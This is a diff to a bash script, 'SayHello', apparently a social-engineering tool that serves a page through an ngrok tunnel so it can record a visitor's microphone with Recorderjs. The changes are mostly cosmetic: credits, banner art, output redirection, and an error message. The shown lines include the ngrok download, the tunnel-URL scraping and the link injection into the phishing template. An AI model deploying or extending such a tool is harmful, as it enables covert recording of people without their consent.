@@ -1,32 +1,28 @@
 #!/bin/bash
 # SayHello v1.0
-# coded by: github.com/thelinuxchoice/sayhello
-# Twitter: @linux_choice
+# coded by: github.com/thelinuxchoice/[DELETED]
+# maintained by: github.com/d093w1z
+# Twitter: @linux_choice @d093w1z
 # Using Recorderjs by: https://github.com/mattdiamond/Recorderjs
 trap 'printf "\n";stop' 2
-
-null="> /dev/null 2>&1"
-if [[ $1 == "-v" ]];then
-null=""
-fi
 
 banner() {
 
 
-printf "\e[1;92m                                          __ \e[0m\n"
-printf "\e[1;93m  ____              _   _      _ _ \e[0m\e[1;92m      /__\  \e[0m\n"
-printf "\e[1;93m / ___|  __ _ _   _| | | | ___| | | ___ \e[0m\e[1;92m \__/  \e[0m\n"
-printf "\e[1;93m \___ \ / _\` | | | | |_| |/ _ \ | |/ _ \ \e[0m\e[1;92m || \e[0m\n"
-printf "\e[1;93m  ___) | (_| | |_| |  _  |  __/ | | (_) | \e[0m\e[1;92m|| \e[0m\n"
-printf "\e[1;93m |____/ \__,_|\__, |_| |_|\___|_|_|\___/  \e[0m\e[1;92m|| \e[0m\n"
-printf "\e[1;93m              |___/                        \e[0m\e[1;92m\__ \e[0m\n"
-printf "\e[1;92m                                              \ \e[0m\n"
+printf "\e[1;92m                                                              \e[0m\n"
+printf "\e[1;93m  ____              _   _      _ _       \e[0m\e[1;92m /__\   \e[0m\n"
+printf "\e[1;93m / ___|  __ _ _   _| | | | ___| | | ___  \e[0m\e[1;92m \__/   \e[0m\n"
+printf "\e[1;93m \___ \ / _\ | | | | |_| |/ _ \ | |/ _ \ \e[0m\e[1;92m  ||    \e[0m\n"
+printf "\e[1;93m  ___) | (_| | |_| |  _  |  __/ | | (_) |\e[0m\e[1;92m  ||    \e[0m\n"
+printf "\e[1;93m |____/ \__,_|\__, |_| |_|\___|_|_|\___/ \e[0m\e[1;92m  ||    \e[0m\n"
+printf "\e[1;93m              |___/                      \e[0m\e[1;92m   \__  \e[0m\n"
+printf "\e[1;92m                                                            \ \e[0m\n"
 
 
-printf "\e[1;77m v1.0 coded by github.com/thelinuxchoice/sayhello\e[0m \n"
+printf "\e[1;77m v1.0 coded by github.com/thelinuxchoice [DELETED]\e[0m \n"
+printf "\e[1;77m v1.0 maintained by github.com/d093w1z\e[0m \n"
 
-printf " Twitter: @linux_choice\n"
-
+printf " Twitter: @linux_choice\t @d093w1z\n"
 
 }
 
@@ -52,10 +48,7 @@ exit 1
 
 dependencies() {
 
-
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
- 
-
 
 }
 
@@ -133,7 +126,6 @@ link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
 
-
 }
 
 ngrok_server() {
@@ -148,10 +140,10 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip $null
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
 
 if [[ -e ngrok-stable-linux-arm.zip ]]; then
-unzip ngrok-stable-linux-arm.zip $null
+unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-arm.zip
 else
@@ -160,9 +152,11 @@ exit 1
 fi
 
 else
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip $null
+
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip 2>&1 > /dev/null 2>&1
+
 if [[ -e ngrok-stable-linux-386.zip ]]; then
-unzip ngrok-stable-linux-386.zip $null
+unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-386.zip
 else
@@ -205,7 +199,7 @@ redirect_link="${redirect_link:-${default_redirect}}"
 
 if [[ $option_server -eq 1 ]]; then
 
-command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 start
 
 elif [[ $option_server -eq 2 ]]; then
